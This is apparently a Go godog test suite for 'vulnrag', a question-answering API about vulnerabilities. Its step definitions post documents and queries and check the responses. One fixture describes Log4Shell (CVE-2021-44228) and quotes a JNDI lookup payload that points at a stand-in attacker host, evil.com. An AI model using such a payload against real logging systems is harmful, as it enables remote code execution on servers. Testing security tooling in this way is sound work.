package tests

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/cucumber/godog"
)

// Run executes the godog test suite.
func Run() int {
	suite := godog.TestSuite{
		Name:                "vulnrag",
		TestSuiteInitializer: InitializeTestSuite,
		ScenarioInitializer:  InitializeScenario,
		Options: &godog.Options{
			Format:   "pretty",
			Paths:    []string{"features/"},
			Strict:   true,
		},
	}

	return suite.Run()
}

// sharedState holds the shared test state.
type sharedState struct {
	mu       sync.Mutex
	apiURL   string
	client   *http.Client
	resp     *http.Response
	body     []byte
	status   int
}

var state = &sharedState{
	client: &http.Client{Timeout: 65 * time.Second},
}

// InitializeTestSuite is the test suite initializer.
func InitializeTestSuite(suiteContext *godog.TestSuiteContext) {
	suiteContext.BeforeSuite(func() {
		apiURL := os.Getenv("TEST_API_URL")
		if apiURL == "" {
			apiURL = "http://localhost:8080"
		}
		state.apiURL = apiURL
	})
}

// InitializeScenario registers step definitions.
func InitializeScenario(sc *godog.ScenarioContext) {
	sc.Before(func(ctx context.Context, sc *godog.Scenario) (context.Context, error) {
		state.mu.Lock()
		state.resp = nil
		state.body = nil
		state.status = 0
		state.mu.Unlock()
		return ctx, nil
	})

	// Ask feature steps
	sc.Step(`^в хранилище загружен документ про CVE-2021-44228$`, (*sharedState).loadDocument)
	sc.Step(`^я отправляю POST /api/v1/ask с вопросом "([^"]*)"$`, (*sharedState).postAsk)
	sc.Step(`^я отправляю POST /api/v1/ask с пустым question$`, (*sharedState).postAskEmpty)
	sc.Step(`^я отправляю POST /api/v1/ask с любым вопросом$`, (*sharedState).postAskAny)

	// Documents feature steps
	sc.Step(`^я отправляю POST /api/v1/documents\s+с title "([^"]*)" и content "([^"]*)"$`, (*sharedState).postDocument)
	sc.Step(`^я отправляю POST /api/v1/documents с content размером 2 МБ$`, (*sharedState).postDocumentTooLarge)
	sc.Step(`^я отправляю POST /api/v1/documents с пустым title$`, (*sharedState).postDocumentEmptyTitle)

	// Common steps
	sc.Step(`^ответ имеет статус (\d+)$`, (*sharedState).assertStatus)
	sc.Step(`^в answer есть текст о Log4Shell$`, (*sharedState).assertAnswerContainsLog4Shell)
	sc.Step(`^sources содержит от 1 до 5 источников$`, (*sharedState).assertSourcesCount)
	sc.Step(`^каждый источник имеет title и snippet$`, (*sharedState).assertSourceFields)
	sc.Step(`^в теле ошибки есть detail$`, (*sharedState).assertErrorDetail)
	sc.Step(`^document_id является UUID$`, (*sharedState).assertDocumentIDIsUUID)
	sc.Step(`^indexed равен true$`, (*sharedState).assertIndexed)
	sc.Step(`^документ доступен для поиска через /ask$`, (*sharedState).assertDocumentIndexed)
}

// Helper methods on sharedState
func (s *sharedState) doRequest(method, path string, body []byte) error {
	var req *http.Request
	var err error

	if body != nil {
		req, err = http.NewRequest(method, s.apiURL+path, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, s.apiURL+path, nil)
	}
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}

	s.resp = resp
	s.body, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	s.status = resp.StatusCode

	return nil
}

// Ask steps
func (s *sharedState) loadDocument() error {
	doc := `{"title":"CVE-2021-44228","content":"Apache Log4j2 version 2.0-beta9 through 2.15.0 JNDI features used in error lookup, message interpolation, lookers, destination string of the Socket Appender and Socket Hub Appender, Redis destination of the Manager Appender, and Kafka appender allow an attacker to control log message interpolation by crafting JNDI lookup patterns like ${jndi:ldap://evil.com/exploit}. CVE-2021-44228 is also known as Log4Shell. The vulnerability allows remote code execution on affected systems."}`
	return s.doRequest("POST", "/api/v1/documents", []byte(doc))
}

func (s *sharedState) postAsk(question string) error {
	type Question struct{
		Question string `json:"question"`
	}
	questionStruct:= &Question{Question:question}
	body, err := json.Marshal(questionStruct)
	if err != nil {
		return err
	}
	return s.doRequest("POST", "/api/v1/ask", []byte(body))
}

func (s *sharedState) postAskEmpty() error {
	body := `{"question":""}`
	return s.doRequest("POST", "/api/v1/ask", []byte(body))
}

func (s *sharedState) postAskAny() error {
	body := `{"question":"what is Log4Shell?"}`
	return s.doRequest("POST", "/api/v1/ask", []byte(body))
}

// Document steps
func (s *sharedState) postDocument(title, content string) error {
	body := fmt.Sprintf(`{"title":"%s","content":"%s"}`, title, content)
	return s.doRequest("POST", "/api/v1/documents", []byte(body))
}

func (s *sharedState) postDocumentTooLarge() error {
	content := strings.Repeat("a", 2*1024*1024)
	body := fmt.Sprintf(`{"title":"Test","content":"%s"}`, content)
	return s.doRequest("POST", "/api/v1/documents", []byte(body))
}

func (s *sharedState) postDocumentEmptyTitle() error {
	body := `{"title":"","content":"some content"}`
	return s.doRequest("POST", "/api/v1/documents", []byte(body))
}

// Assertion steps
func (s *sharedState) assertStatus(expectedStatus int) error {
	if s.resp == nil {
		return fmt.Errorf("no response received")
	}
	if s.status != expectedStatus {
		return fmt.Errorf("expected status %d, got %d (body: %s)", expectedStatus, s.status, string(s.body))
	}
	return nil
}

func (s *sharedState) assertAnswerContainsLog4Shell() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	answer, ok := resp["answer"].(string)
	if !ok {
		return fmt.Errorf("answer field not found or not a string")
	}
	lower := strings.ToLower(answer)
	if !strings.Contains(lower, "log4") {
		return fmt.Errorf("answer does not mention Log4Shell (got: %.200s...)", answer)
	}
	return nil
}

func (s *sharedState) assertSourcesCount() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	sources, ok := resp["sources"].([]interface{})
	if !ok {
		return fmt.Errorf("sources field not found")
	}
	count := len(sources)
	if count < 1 || count > 5 {
		return fmt.Errorf("sources count %d not in range 1-5", count)
	}
	return nil
}

func (s *sharedState) assertSourceFields() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	sources, ok := resp["sources"].([]interface{})
	if !ok {
		return fmt.Errorf("sources field not found")
	}
	for i, src := range sources {
		srcMap, ok := src.(map[string]interface{})
		if !ok {
			return fmt.Errorf("source %d is not an object", i)
		}
		if _, hasTitle := srcMap["title"]; !hasTitle {
			return fmt.Errorf("source %d missing title", i)
		}
		if _, hasSnippet := srcMap["snippet"]; !hasSnippet {
			return fmt.Errorf("source %d missing snippet", i)
		}
	}
	return nil
}

func (s *sharedState) assertErrorDetail() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	errObj, ok := resp["error"].(map[string]interface{})
	if !ok {
		return fmt.Errorf("error field not found or not an object")
	}
	if _, hasDetail := errObj["detail"]; !hasDetail {
		return fmt.Errorf("error detail field not found")
	}
	return nil
}

func (s *sharedState) assertDocumentIDIsUUID() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	docID, ok := resp["document_id"].(string)
	if !ok {
		return fmt.Errorf("document_id field not found or not a string")
	}
	uuidRegex := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	if !uuidRegex.MatchString(docID) {
		return fmt.Errorf("document_id %q is not a valid UUID", docID)
	}
	return nil
}

func (s *sharedState) assertIndexed() error {
	if s.body == nil {
		return fmt.Errorf("no response body")
	}
	var resp map[string]interface{}
	if err := json.Unmarshal(s.body, &resp); err != nil {
		return fmt.Errorf("invalid JSON: %w", err)
	}
	indexed, ok := resp["indexed"].(bool)
	if !ok {
		return fmt.Errorf("indexed field not found or not a boolean")
	}
	if !indexed {
		return fmt.Errorf("indexed is not true")
	}
	return nil
}

func (s *sharedState) assertDocumentIndexed() error {
	body := `{"question":"что такое Log4Shell?"}`
	if err := s.doRequest("POST", "/api/v1/ask", []byte(body)); err != nil {
		return err
	}
	if s.status != http.StatusOK {
		return fmt.Errorf("document not searchable: expected 200, got %d", s.status)
	}
	return nil
}
